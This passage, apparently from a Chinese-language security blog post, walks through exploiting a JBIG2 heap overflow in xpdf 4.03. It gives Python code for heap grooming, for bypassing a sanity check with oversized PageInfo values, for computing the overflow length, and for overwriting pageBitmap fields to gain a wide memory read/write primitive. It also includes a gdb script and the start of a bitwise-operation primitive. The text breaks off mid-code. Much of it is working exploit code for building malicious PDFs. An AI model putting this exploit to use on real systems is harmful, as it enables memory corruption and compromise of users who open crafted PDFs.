Heap grooming: eat every chunk in &#123;tcache,fast,small,large,unsorted&#125; bins</span></span><br><span class="line">    [[DummyAlloc(size)] * <span class="number">128</span> <span class="keyword">for</span> size <span class="keyword">in</span> range(<span class="number">0x10</span>, <span class="number">0x1000</span>, <span class="number">0x10</span>)],</span><br><span class="line">    [[DummyAlloc(size)] * <span class="number">16</span> <span class="keyword">for</span> size <span class="keyword">in</span> range(<span class="number">0x1000</span>, <span class="number">0x10000</span>, <span class="number">0x100</span>)],</span><br><span class="line">    <span class="comment"># ------------ 开始尝试堆风水 ------------</span></span><br><span class="line">    [SymbolDict(i, []) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, glist_capacity // <span class="number">2</span>)],</span><br><span class="line">    <span class="comment"># Now most bins are empty, except tcachebin 0x20, 0x50 and small bin 0x20</span></span><br><span class="line">    <span class="comment"># This triggers GList::expand(), 0x80 -&gt; 0x100; allocates from top chunk</span></span><br><span class="line">    SymbolDict(glist_capacity // <span class="number">2</span>, []),</span><br><span class="line">    [SymbolDict(i, []) <span class="keyword">for</span> i <span class="keyword">in</span> range(glist_capacity // <span class="number">2</span> + <span class="number">1</span>, glist_capacity)],</span><br><span class="line">    <span class="comment"># 0x100 -&gt; 0x200, the old chunk should fall in tcache</span></span><br><span class="line">    SymbolDict(<span class="number">100</span>, []),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>global segment 的堆风水执行结束后，其堆布局大致如下：</p>
<blockquote>
<p>注意 segNum 从 3 开始的 Symbol Dict，其结构体所分配的堆块（chunk size = 0x40）也是直接来自于 top chunk 。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// low address --------------------------------------------</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    一些其他的堆块分配，包括 </span></span><br><span class="line"><span class="comment">    1. size=8 的 global GList backing store</span></span><br><span class="line"><span class="comment">    2. DummyAlloc</span></span><br><span class="line"><span class="comment">    3. SymbolDict0、1、2</span></span><br><span class="line"><span class="comment">    4. ...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">SymbolDict3<span class="number">-8</span>;</span><br><span class="line">size=<span class="number">16</span> 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict9<span class="number">-16</span>;</span><br><span class="line">size=<span class="number">32</span> 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict17<span class="number">-32</span>;</span><br><span class="line">size=<span class="number">64</span> 的 global GList backing store <span class="comment">// 最终的 GList data 堆位置，这里可不是堆空洞</span></span><br><span class="line"><span class="comment">// high address -------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>接下来，只需分别</p>
<ul>
<li>
<p>让 pageBitmap backing store 占据 size=16 的 Glist 堆空洞</p>
</li>
<li>
<p>让解析 TextRegion 时创建的 syms 指针数组占据 size=32 的 Glist 堆空洞</p>
</li>
</ul>
<p>即可完成堆布局。</p>
<blockquote>
<p>pageBitmap 的 JBIG2Bitmap 结构体堆位置在下文中将会说明。</p>
</blockquote>
<p>最后贴个 gdb script，可以使用该 gdbscript 辅助观察内存布局：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">file ../../xpdf-4.03/build/xpdf/pdftohtml</span><br><span class="line">aslr off</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br><span class="line"></span><br><span class="line">b readSymbolDictSeg <span class="keyword">if</span> segNum==8</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"sakura in read symbol 8\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"globalSegments addr is:0x%llx\n"</span>, segments</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"segments GList backing buffer\n"</span></span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    <span class="comment"># tcachebins</span></span><br><span class="line">    bins</span><br><span class="line">    <span class="comment"># c</span></span><br><span class="line">end</span><br><span class="line">b readSymbolDictSeg <span class="keyword">if</span> segNum==16</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"sakura in read symbol 16\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"globalSegments addr is:0x%llx\n"</span>, segments</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"segments GList backing buffer\n"</span></span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    <span class="comment"># tcachebins</span></span><br><span class="line">    bins</span><br><span class="line">    <span class="comment"># c</span></span><br><span class="line">end</span><br><span class="line">b readSymbolDictSeg <span class="keyword">if</span> segNum==100</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"sakura in read symbol 32\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"globalSegments addr is:0x%llx\n"</span>, segments</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"segments GList backing buffer\n"</span></span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    <span class="comment"># tcachebins</span></span><br><span class="line">    bins</span><br><span class="line">    </span><br><span class="line">    tb JBIG2Stream.cc:1481</span><br><span class="line">    commands</span><br><span class="line">        <span class="built_in">printf</span> <span class="string">"after finish globalSegments addr is:0x%llx\n"</span>, segments</span><br><span class="line">        p *(GList *)segments</span><br><span class="line">        <span class="comment"># tcachebins</span></span><br><span class="line">        bins</span><br><span class="line">    end</span><br><span class="line">    <span class="comment"># replace finish and print info</span></span><br><span class="line">    <span class="comment"># c</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b JBIG2Stream.cc:2072 <span class="keyword">if</span> segNum==102</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"sakura in TextRegion to trigger oob\n"</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"numSyms after underoverflow is:0x%llx\n"</span>, numSyms</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$oob_syms</span> = <span class="variable">$rax</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"undersized syms buffer addr is:0x%llx\n"</span>, <span class="variable">$oob_syms</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"globalSegments addr is:0x%llx\n"</span>, globalSegments</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"segments GList backing buffer\n"</span></span><br><span class="line">    p *(GList *)globalSegments</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"pageBitmap addr is :0x%llx\n"</span>, pageBitmap</span><br><span class="line">    p *(JBIG2Bitmap *)pageBitmap</span><br><span class="line">    bins</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">r sploit.pdf output</span><br></pre></td></tr></table></figure>
<h4 id="b-占据堆空洞">b. 占据堆空洞</h4>
<p>global stream 中的解析操作是为了创建堆空洞，那 main stream 的解析操作就是为了占据堆空洞。</p>
<p>承接上文，接下来我们试着分配一个全新的 pageBitmap 结构，并让其 backing store 占据 size=16 的 Glist 空洞：</p>
<blockquote>
<p>代码中的 GLIST_DATA_SIZE = 0x200，表示 size=64 时 global glist data 占据的字节数。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">page0 = [</span><br><span class="line">    <span class="comment"># Make sure page bitmap buffer uses the second-last globalSegments data buffer so</span></span><br><span class="line">    <span class="comment"># that it lies just before syms, at a fixed offset.</span></span><br><span class="line">    <span class="comment"># GLIST_DATA_SIZE // 4，表示占据 size=16 时的 glist 堆空洞</span></span><br><span class="line">    PageInfo(<span class="number">101</span>, w=<span class="number">8</span> * (GLIST_DATA_SIZE // <span class="number">4</span>), h=<span class="number">1</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>此时堆布局如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// low address --------------------------------------------</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    一些其他的堆块分配，包括 </span></span><br><span class="line"><span class="comment">    1. size=8 的 global GList backing store</span></span><br><span class="line"><span class="comment">    2. DummyAlloc</span></span><br><span class="line"><span class="comment">    3. SymbolDict0、1、2</span></span><br><span class="line"><span class="comment">    4. ...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">SymbolDict3<span class="number">-8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意这里！</span></span><br><span class="line">pageBitmap backing buffer <span class="comment">// size=16 的 global GList backing store 堆空洞</span></span><br><span class="line">    </span><br><span class="line">SymbolDict9<span class="number">-16</span>;</span><br><span class="line"></span><br><span class="line">size=<span class="number">32</span> 的 global GList backing store 堆空洞</span><br><span class="line">    </span><br><span class="line">SymbolDict17<span class="number">-32</span>;</span><br><span class="line"></span><br><span class="line">size=<span class="number">64</span> 的 global GList backing store; <span class="comment">// 最终的 GList data 堆位置，这里可不是堆空洞</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意这里！</span></span><br><span class="line">pageBitmap JBIG2Bitmap; 结构体 </span><br><span class="line">    </span><br><span class="line"><span class="comment">// high address -------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>这里简单说一下 pageBitmap <strong>结构本身的堆块分配(JBIG2Bitmap)</strong>，由于其 size 0x20 在堆链上找不到可分配的堆块，因此将<strong>仍然从 top chunk 中分配</strong>，故其地址位于 size=64 的 Glist 位置的<strong>高地址处</strong>，满足堆风水要求。</p>
<p>接下来需要在解析 TextRegion 时继续占用 size=32 的 Glist 堆空洞。因此 TextRegion 中创建的用户内存大小必须是 <code>syms_size = GLIST_DATA_SIZE // 2</code>，正好对应到 size=32 的 Glist 堆空洞大小。</p>
<p>但在做进一步的利用之前，我们需要绕过一个<a href="https://fossies.org/diffs/xpdf/4.02_vs_4.03/xpdf/JBIG2Stream.cc-diff.html" target="_blank" rel="noopener">比较有趣的 sanity check</a>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sanity check: if the w/h/x/y values are way out of range, it likely</span></span><br><span class="line"><span class="comment">// indicates a damaged JBIG2 stream</span></span><br><span class="line"><span class="keyword">if</span> (w / <span class="number">10</span> &gt; pageW || h / <span class="number">10</span> &gt; pageH ||</span><br><span class="line">    x / <span class="number">10</span> &gt; pageW || y / <span class="number">10</span> &gt; pageH) &#123;</span><br><span class="line">    error(errSyntaxError, getPos(),</span><br><span class="line">          <span class="string">"Bad size or position in JBIG2 text region segment"</span>);</span><br><span class="line">    done = gTrue;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>xpdf-4.03/xpdf/JBIG2Stream.cc</code> 中多次出现上面的这种 sanity check，判断当前正在处理的 w\h\x\y 是否越过了当前的 pageW 和 pageH（两个 JBIG2Stream 类的成员变量，用于表示当前 page 的宽度和高度），如果越界则说明当前解析过程可能存在问题，那么则立即停止解析当前 segment。</p>
<p>看上去好像这个 sanity check 没啥问题…</p>
<p>但实际上，我们回过头看看 <code>readPageInfoSeg</code> 函数的代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::readPageInfoSeg</span><span class="params">(Guint length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Guint xRes, yRes, flags, striping;</span><br><span class="line">    <span class="comment">// 从不受信任的流中直接读入 pageW 和 pageH</span></span><br><span class="line">    <span class="keyword">if</span> (!readULong(&amp;pageW) || !readULong(&amp;pageH) ||</span><br><span class="line">        !readULong(&amp;xRes) || !readULong(&amp;yRes) ||</span><br><span class="line">        !readUByte(&amp;flags) || !readUWord(&amp;striping))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> eofError;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果 pageW 和 pageH 过大</span></span><br><span class="line">    <span class="keyword">if</span> (pageW == <span class="number">0</span> || pageH == <span class="number">0</span> || pageW &gt; INT_MAX / pageW)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 则直接退出 pageInfoSeg 的解析</span></span><br><span class="line">        error(errSyntaxError, getPos(), <span class="string">"Bad page size in JBIG2 stream"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以非常容易的发现， 即便 <code>readPageInfoSeg</code> 函数中检测到了 <code>pageW</code> 和 <code>pageH</code> 的异常，但也只是简单的退出掉当前 seg 的解析，<strong>保留了畸形 <code>pageW</code> 和 <code>pageH</code> 的值在 JBIG2Stream 类成员中</strong>。</p>
<p>这样，我们可以尝试插入一个超大 pageW 和 pageH 的 PageInfoSeg，从而污染这两个字段为超大值，bypass 后续所有新增加的 sanity check：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">page0 = [</span><br><span class="line">    <span class="comment"># Make sure page bitmap buffer uses the second-last globalSegments data buffer so</span></span><br><span class="line">    <span class="comment"># that it lies just before syms, at a fixed offset.</span></span><br><span class="line">    PageInfo(<span class="number">101</span>, w=<span class="number">8</span> * (GLIST_DATA_SIZE // <span class="number">4</span>), h=<span class="number">1</span>),</span><br><span class="line">    <span class="comment"># Change pageH and pageW to a large value to bypass a (seriously funny) sanity</span></span><br><span class="line">    <span class="comment"># check introduced in Xpdf 4.03; Xpdf would report an error without allocating</span></span><br><span class="line">    <span class="comment"># a new pageBitmap, but won't stop parsing the JBIG2 stream, which is exactly what</span></span><br><span class="line">    <span class="comment"># we want.</span></span><br><span class="line">    PageInfo(<span class="number">101</span>, w=<span class="number">1919114514</span>, h=<span class="number">1919114514</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>bypass 掉这个 sanity check 后，接下来就可以尝试创建 TextRegionSeg 来进行堆溢出了。承接上面所说的，这里所创建的 TextRegionSeg 需要满足几种要求：</p>
<ul>
<li>其内部创建的 syms 大小必须是 syms_size（这个值上面已经说明了）</li>
<li>向堆块写入的数据大小为 <code>size_to_overflow</code> 个字节，即实际写 <code>size_to_overflow // 8</code> 个指针</li>
</ul>
<p>因此接下来在 main stream 中，需要合理组合 TextRegion 所引用的 Symbol Dict 大小：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Trigger the out-of-bound write.</span></span><br><span class="line">TextRegion(</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    w=<span class="number">1</span>,</span><br><span class="line">    h=<span class="number">1</span>,</span><br><span class="line">    x=<span class="number">0</span>,</span><br><span class="line">    y=<span class="number">0</span>,</span><br><span class="line">    <span class="comment"># size_to_overflow // 8 个指针</span></span><br><span class="line">    ref_segs=[<span class="number">1</span>] </span><br><span class="line">    <span class="comment"># 0x10000 + (syms_size - size_to_overflow) // 8 个指针</span></span><br><span class="line">    + [<span class="number">2</span>] * (<span class="number">0x10000</span> + (syms_size - size_to_overflow) // <span class="number">8</span>)</span><br><span class="line">    <span class="comment"># 共 0xffff0000 个指针</span></span><br><span class="line">    + [<span class="number">0</span>] * <span class="number">0xFFFF</span>, </span><br><span class="line">),</span><br></pre></td></tr></table></figure>
<p>上面代码的组合中，</p>
<p>$$size_to_overflow / 8 + {0x10000 + (syms_size - size_to_overflow) / 8} + 0xffff0000 = 0x100000000 + syms_size/8$$，即刚好分配 syms_size 个字节。</p>
<p>又因为先 ref 的那个 Symbol Dict 的大小为 <code>size_to_overflow // 8</code> 个指针。因此当 readTextRegion 解析第一个 ref 的 Symbol Dict 时，刚好向 syms 堆块中写入 <code>size_to_overflow</code> 个字节，直接溢出至 pageBitmap JBIG2Bitmap 结构体头部位置，如此便能达到溢出的目的。</p>
<p>这里说明一下 size_to_overflow 是怎么得出的，先上堆布局：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// low address --------------------------------------------</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    一些其他的堆块分配，包括 </span></span><br><span class="line"><span class="comment">    1. size=8 的 global GList backing store</span></span><br><span class="line"><span class="comment">    2. DummyAlloc</span></span><br><span class="line"><span class="comment">    3. SymbolDict0、1、2</span></span><br><span class="line"><span class="comment">    4. ...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">SymbolDict3<span class="number">-8</span>;</span><br><span class="line">pageBitmap backing buffer <span class="comment">// size=16 的 global GList backing store 堆空洞</span></span><br><span class="line">SymbolDict9<span class="number">-16</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从此处开始写入数据</span></span><br><span class="line">syms <span class="comment">// syms 的 size 为 syms_size</span></span><br><span class="line">SymbolDict17<span class="number">-32</span>; <span class="comment">// 16 个 SymbolDict 的 size，一个 SymbolDict 的 size 为 0x40 字节</span></span><br><span class="line">size=<span class="number">64</span> 的 global GList backing store; <span class="comment">// 此时的 Glist size 为 GLIST_DATA_SIZE</span></span><br><span class="line">pageBitmap JBIG2Bitmap 结构体  <span class="comment">// 这里还需要覆写 vtble + segNum + w + h + line，共24字节</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// high address -------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>根据堆布局可得知：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">size_to_overflow = (</span><br><span class="line">    ptmalloc_chunk_size(syms_size)</span><br><span class="line">    <span class="comment"># 40: sizeof(JBIG2SymbolDict); there are (glist_capacity // 2) irrelevant JBIG2SymbolDict-s</span></span><br><span class="line">    + ptmalloc_chunk_size(<span class="number">40</span>) * (glist_capacity // <span class="number">2</span>)</span><br><span class="line">    + ptmalloc_chunk_size(GLIST_DATA_SIZE)</span><br><span class="line">    <span class="comment"># Current page JBIG2Bitmap</span></span><br><span class="line">    <span class="comment"># vtbl(8)</span></span><br><span class="line">    + <span class="number">8</span></span><br><span class="line">    <span class="comment"># segNum(4), w(4), h(4), line(4)</span></span><br><span class="line">    + <span class="number">4</span> * <span class="number">4</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>之后，将 readTextRegionSeg 中刚刚被释放掉的那个 syms_size 大小的堆块再次分配回来，防止在后续的利用中出现可能的崩溃。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Take back the free-d syms, hold it to prevent potential crash.</span></span><br><span class="line">GenericRegion(<span class="number">103</span>, imm=<span class="literal">False</span>, bitmap=Bitmap(<span class="number">8</span>, syms_size)),</span><br></pre></td></tr></table></figure>
<p>由于越界写入 pageBitmap JBIG2Bitmap 结构体头部位置的是<strong>指针值</strong>，可以越界读写的数据有限，因此我们需要根据这个有限的 pageBitmap 越界读写原语，来自己修改自己的 JBIG2Bitmap 结构体头，将其中的 w\h\line 修改的更大，扩展自己的读写范围。根据上面的堆布局，同样可以得出 <code>page_bitmap_buf</code> 至 <code>pageBitmap JBIG2Bitmap</code> 的距离：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">page_bitmap_buf_to_class_offset = (</span><br><span class="line">    ptmalloc_chunk_size(GLIST_DATA_SIZE <span class="comment">// 4)</span></span><br><span class="line">    + ptmalloc_chunk_size(<span class="number">40</span>) * (glist_capacity <span class="comment">// 4)</span></span><br><span class="line">    + size_to_overflow</span><br><span class="line">    - <span class="number">4</span> * <span class="number">4</span></span><br><span class="line">    - <span class="number">8</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>之后将其 w\h\line 分别更改为 $w=2^{27}$、$h=2^{24}$、$line=2^{24}$：</p>
<blockquote>
<p>imm 为 true 表示即时渲染，即立即修改 pageBitmap 上的指定位置。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Overwrite pageBitmap-&gt;w, h and line</span></span><br><span class="line">GenericRegion(</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    x=(page_bitmap_buf_to_class_offset + <span class="number">12</span>) * <span class="number">8</span>,</span><br><span class="line">    y=<span class="number">0</span>,</span><br><span class="line">    comb_op=CombOp.Replace,</span><br><span class="line">    <span class="comment"># (x, y) -&gt; mem[(y &lt;&lt; 24) | (x &gt;&gt; 3)] &gt;&gt; (7 - (x &amp; 7)), max 48-bit addressing</span></span><br><span class="line">    bitmap=Bitmap(struct.pack(<span class="string">"&lt;III"</span>, <span class="number">2</span> ** <span class="number">27</span>, <span class="number">2</span> ** <span class="number">24</span>, <span class="number">2</span> ** <span class="number">24</span>)),</span><br><span class="line">    imm=<span class="literal">True</span>,</span><br><span class="line">),</span><br></pre></td></tr></table></figure>
<p>修改后的 pageBitmap 的二维空间构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------------------&gt; w&#x3D;2^27 bit</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">V h&#x3D;2^24 bit</span><br></pre></td></tr></table></figure>
<p>最后创建带有 16 个 Bitmap 的 SymbolDict ，以备接下来的利用所使用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 16 "variables". Since we can only do bitwise operations relative to page bitmap</span></span><br><span class="line"><span class="comment"># with Refinement regions, we need these variables for peeking other absolute</span></span><br><span class="line"><span class="comment"># addresses, and also rebase the page bitmap in one segment command.</span></span><br><span class="line">SymbolDict(<span class="number">105</span>, [Bitmap(<span class="number">64</span>, <span class="number">1</span>)] * <span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p>这些 SymbolDict 将用于<strong>地址解引用原语</strong>中，具体在下面会详细介绍。</p>
<blockquote>
<p>整体的堆风水布局大体如上所示。完成堆溢出后，pageBitmap 具备了大偏移读写的功能，因此接下来就要开始写原语利用了。</p>
</blockquote>
<h3 id="2-位运算原语">2. 位运算原语</h3>
<p>还记得先前介绍的 <code>GenericRefinementRegionSeg</code> 么（不记得就翻到上面看看），接下来我们需要利用这个 seg 的特性来编写任意位的位运算器。</p>
<p>exploit 中实现的位运算器如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BitSeg</span>:</span></span><br><span class="line">    _seq = itertools.count(<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seg_num)</span>:</span></span><br><span class="line">        self.seg_num = seg_num</span><br><span class="line">        self.__consumed = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">consume</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> self.__consumed</span><br><span class="line">        self.__consumed = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> self.seg_num</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_page</span><span class="params">(cls, offset)</span>:</span></span><br><span class="line">        x, y = offset % <span class="number">2</span> ** <span class="number">27</span>, offset // <span class="number">2</span> ** <span class="number">27</span></span><br><span class="line">        idx = next(cls._seq)</span><br><span class="line">        page0.append(ReadoutRefinement(idx, x=x, y=y, imm=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">return</span> cls(idx)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CombOp</span><span class="params">(enum.IntEnum)</span>:</span></span><br><span class="line">    Or = <span class="number">0</span></span><br><span class="line">    And = <span class="number">1</span></span><br><span class="line">    Xor = <span class="number">2</span></span><br><span class="line">    Xnor = <span 